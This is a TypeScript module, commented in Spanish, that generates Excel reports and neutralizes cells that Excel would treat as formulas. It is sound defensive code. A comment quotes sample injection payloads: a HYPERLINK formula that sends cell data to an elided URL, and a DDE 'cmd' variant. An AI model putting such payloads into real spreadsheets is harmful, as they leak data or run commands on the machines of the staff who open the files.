import ExcelJS from 'exceljs';
import type { ColumnaReporte } from './report-columns.js';
import { hexAArgb, type Plantilla } from './report-template.js';

/**
 * Generación de las hojas de Excel.
 *
 * Separado del PDF y de las rutas por el mismo motivo: son tres oficios que no
 * cambian por las mismas razones. Cambiar el ancho de una columna del acta
 * impresa no debería obligar a abrir el archivo donde se decide quién puede
 * descargarla.
 */

/**
 * Neutraliza una celda que Excel interpretaría como fórmula.
 *
 * Excel y LibreOffice ejecutan el contenido de cualquier celda que empiece por
 * `=`, `+`, `-`, `@`, tabulador o retorno de carro. Y las columnas de estos
 * informes son texto que escribe gente: el nombre de un estudiante llega por
 * importación de listado, por OCR de una foto o escrito a mano; la observación
 * de una asistencia son 500 caracteres libres del docente.
 *
 * Un estudiante llamado `=HYPERLINK("http://…"&A1,"Ver acta")` se ejecuta **en
 * la máquina de quien abre el acta**, que es coordinación o secretaría, y la
 * variante con `cmd|'/c …'!A0` sigue funcionando en instalaciones sin los
 * parches de DDE. No hace falta que el atacante sea nadie de dentro: basta que
 * el nombre entre por el escáner de una planilla.
 *
 * `shared/sanitize.ts` no cubría esto: sanea lo que se **guarda** en auditoría
 * y telemetría, no lo que **sale** hacia un archivo. Son dos fronteras
 * distintas y cada una necesita la suya.
 *
 * El apóstrofo inicial es el escape que Excel entiende: fuerza el contenido a
 * texto y no se ve al abrir el archivo.
 */
const ARRANQUE_DE_FORMULA = /^[=+\-@\t\r]/;

export function celdaSegura<T>(valor: T): T | string {
  if (typeof valor !== 'string') return valor;
  return ARRANQUE_DE_FORMULA.test(valor) ? `'${valor}` : valor;
}

/**
 * Añade una fila con todas sus celdas de texto neutralizadas.
 *
 * Se usa **en vez de** `ws.addRow()` en todo lo que salga de la base. Es una
 * función y no una regla escrita en una guía porque una regla negativa —«no
 * llames a addRow directamente»— se cumple en todos los sitios menos en el que
 * alguien añada dentro de un año.
 */
export function agregarFila(
  ws: ExcelJS.Worksheet,
  fila: Record<string, unknown> | unknown[],
) {
  // Las dos formas que `addRow` acepta y que este repositorio usa: el arreglo
  // posicional que devuelve `construirFilas()` y el objeto por clave de
  // `coordination.renderer.ts`.
  if (Array.isArray(fila)) return ws.addRow(fila.map(celdaSegura));

  const saneada: Record<string, unknown> = {};
  for (const [clave, valor] of Object.entries(fila)) saneada[clave] = celdaSegura(valor);
  return ws.addRow(saneada);
}

/** Cabecera con estilo, filtro y fila congelada. */
export function excelSheetStyle(ws: ExcelJS.Worksheet, widthCount: number, headerArgb = 'FF17313B') {
  ws.getRow(1).font = { bold: true, color: { argb: 'FFFFFFFF' } };
  ws.getRow(1).fill = {
    type: 'pattern',
    pattern: 'solid',
    fgColor: { argb: headerArgb },
  };
  ws.getRow(1).alignment = { vertical: 'middle', horizontal: 'center' };
  ws.autoFilter = { from: 'A1', to: `${String.fromCharCode(64 + widthCount)}1` };
  ws.views = [{ state: 'frozen', ySplit: 1 }];
}

/** Configura las columnas de una hoja desde el catálogo. */
export function hojaDeCatalogo(
  ws: ExcelJS.Worksheet,
  columnas: ColumnaReporte[],
  plantilla: Plantilla,
) {
  ws.columns = columnas.map(c => ({ header: c.header, key: c.key, width: c.excelWidth }));
  excelSheetStyle(ws, columnas.length, hexAArgb(plantilla.colores.encabezadoExcel));
}

/** Envía el libro como descarga. */
export async function enviarExcel(
  res: { setHeader(name: string, value: string): void; send(body: Buffer): void },
  wb: ExcelJS.Workbook,
  filename: string,
) {
  const buffer = await wb.xlsx.writeBuffer();
  res.setHeader('Content-Type', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet');
  res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
  res.send(Buffer.from(buffer));
}
